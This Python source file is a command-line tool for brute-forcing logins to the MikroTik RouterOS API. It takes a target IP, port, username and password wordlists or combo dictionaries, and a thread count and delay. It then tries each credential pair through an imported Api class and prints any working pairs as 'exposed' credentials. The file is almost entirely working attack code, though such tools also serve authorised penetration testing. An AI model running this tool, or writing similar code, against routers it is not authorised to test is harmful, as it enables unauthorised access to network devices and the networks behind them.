#!/usr/bin/env python
# -*- coding: utf-8 -*-
_version = "1.6"

import time, argparse, threading, concurrent.futures
from datetime import datetime
from pathlib import Path

try:
    from _api import Api
except ModuleNotFoundError:
    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_api' not found. Make sure the _api.py file is present in the same directory as this tool.")

try:
    from _log import Log
except ModuleNotFoundError:
    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_log' not found. Make sure the _log.py file is present in the same directory as this tool.")

def current_time():
    return datetime.now().strftime("%H:%M:%S")


class Bruteforce:
    def __init__(self, target, port, usernames, passwords, combo_dict, delay, use_ssl=False, max_workers=5):
        self.target = target
        self.port = port
        self.usernames = usernames
        self.passwords = passwords
        self.combo_dict = combo_dict
        self.delay = delay
        self.use_ssl = use_ssl
        self.max_workers = max_workers
        self.log = Log(True, None, None)
        self.wordlist = []
        self.successes = []
        self.lock = threading.Lock()
        self.index_lock = threading.Lock()
        self.index = 0
        self.load_wordlist()

    def load_file(self, path):
        with open(path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]

    def load_wordlist(self):
        try:
            if self.combo_dict:
                self.wordlist = [tuple(line.strip().split(':')) for line in self.load_file(self.combo_dict) if ':' in line]
            elif self.usernames and self.passwords:
                is_userfile = Path(self.usernames).is_file()
                is_passfile = Path(self.passwords).is_file()

                if not is_userfile and not is_passfile:
                    self.wordlist = [(self.usernames, self.passwords)]
                elif is_userfile and not is_passfile:
                    users = self.load_file(self.usernames)
                    self.wordlist = [(u, self.passwords) for u in users]
                elif not is_userfile and is_passfile:
                    pwds = self.load_file(self.passwords)
                    self.wordlist = [(self.usernames, p) for p in pwds]
                else:
                    users = self.load_file(self.usernames)
                    pwds = self.load_file(self.passwords)
                    self.wordlist = [(u, p) for u in users for p in pwds]
            elif self.usernames:
                if Path(self.usernames).is_file():
                    self.wordlist = [(u, '') for u in self.load_file(self.usernames)]
                else:
                    self.wordlist = [(self.usernames, '')]
            elif self.passwords:
                if Path(self.passwords).is_file():
                    self.wordlist = [("admin", p) for p in self.load_file(self.passwords)]
                else:
                    self.wordlist = [("admin", self.passwords)]
            else:
                self.wordlist = [("admin", "")]  # fallback

        except Exception as e:
            self.log.error(f"Error loading wordlist: {e}")
            exit(1)

    def get_next_combo(self):
        with self.index_lock:
            if self.index >= len(self.wordlist):
                return None
            combo = self.wordlist[self.index]
            self.index += 1
            return combo

    def worker(self):
        while True:
            combo = self.get_next_combo()
            if combo is None:
                break
            user, password = combo
            try:
                api = Api(self.target, self.port, use_ssl=self.use_ssl)
                result = api.login(user, password)
                if result:
                    with self.lock:
                        self.successes.append((user, password))
                    self.log.success(f"Current testing -> {user}:{password}")
                else:
                    self.log.fail(f"Current testing -> {user}:{password}")
            except Exception as e:
                self.log.warning(f"Error trying password '{password}': {e}")
            time.sleep(self.delay)

    def run(self):
        self.log.info("[*] Starting brute force attack...")
        self.log.info(f"[*] Total Attempts {len(self.wordlist)}...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.worker) for _ in range(self.max_workers)]
            concurrent.futures.wait(futures)

        self.log.info("[*] Attack finished.\n")

        if self.successes:
            print("\n## CREDENTIAL(S) EXPOSED ##")
            deduped = list(dict.fromkeys(self.successes))
            max_user = max(len(u) for u, _ in deduped)
            max_pass = max(len(p) for _, p in deduped)
            print(f"ORD  | {'USERNAME':^{max_user}} | {'PASSWORD':^{max_pass}}")
            print(f"{'-'*4}+{'-'*(max_user+2)}+{'-'*(max_pass+2)}")
            for idx, (user, pwd) in enumerate(deduped, start=1):
                print(f"{idx:03} | {user:^{max_user}} | {pwd:^{max_pass}}")
            print("\nAttack completed successfully.\n")
        else:
            print("\nNo credentials were validated successfully with the given users and passwords.\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Mikrotik API Brute Force Tool")
    parser.add_argument("-t", "--target", required=True, help="Mikrotik IP address")
    parser.add_argument("-T", "--port", type=int, default=8728, help="API port (default: 8728)")
    parser.add_argument("-U", "--user", help="Single username")
    parser.add_argument("-P", "--passw", help="Single password")
    parser.add_argument("-u", "--userlist", help="Path to user wordlist")
    parser.add_argument("-p", "--passlist", help="Path to password wordlist")
    parser.add_argument("-d", "--dictionary", help="Path to combo dictionary (user:pass)")
    parser.add_argument("-s", "--seconds", type=int, default=1, help="Delay between attempts (default: 1s)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL connection (port 8729)")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    args = parser.parse_args()

    print(f"""
        __  __ _ _              _   _ _        _    ____ ___      ____  _____
        |  \/  (_) | ___ __ ___ | |_(_) | __   / \  |  _ \_ _|    | __ )|  ___|
        | |\/| | | |/ / '__/ _ \| __| | |/ /  / _ \ | |_) | |_____|  _ \| |_
        | |  | | |   <| | | (_) | |_| |   <  / ___ \|  __/| |_____| |_) |  _|
        |_|  |_|_|_|\_\_|  \___/ \__|_|_|\_\/_/   \_\_|  |___|    |____/|_|

                   Mikrotik RouterOS API Bruteforce Tool v{_version}
                     André Henrique (X / Linkedin: @mrhenrike)
            Please report tips, suggests and problems to X or LinkedIn
                    https://github.com/mrhenrike/MikrotikAPI-BF
    """)

    usernames = args.userlist if args.userlist else args.user
    passwords = args.passlist if args.passlist else args.passw

    bf = Bruteforce(
        target=args.target,
        port=args.port,
        usernames=usernames,
        passwords=passwords,
        combo_dict=args.dictionary,
        delay=args.seconds,
        use_ssl=args.ssl,
        max_workers=args.threads
    )

    try:
        bf.run()
    except KeyboardInterrupt:
        print(f"\n[{current_time()}] [!] Attack interrupted by user. Exiting cleanly.\n")
